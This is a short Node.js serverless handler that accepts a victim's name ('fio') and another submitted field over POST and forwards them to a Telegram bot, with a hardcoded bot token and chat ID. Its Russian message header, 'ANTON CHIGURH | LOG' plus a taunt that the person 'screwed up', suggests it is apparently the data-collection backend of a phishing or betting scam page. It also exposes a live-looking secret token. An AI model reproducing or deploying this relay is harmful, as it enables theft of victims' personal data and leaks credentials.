module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send('ERR');
  const { fio, addr } = req.body;
  const token = '8040858042:AAHYFzMmMwzXduxH3d39bE767qJ0VH9vcTo'; 
  const chat = '-1003591999988';

  const text = `🌑 **ANTON CHIGURH | LOG ОН ПРОЕБАЛ!**\n\n👤 Имя: ${fio}\n💰 Ставка: ${addr}`;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chat, text: text, parse_mode: 'Markdown' })
    });
    res.status(200).json({ success: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
};
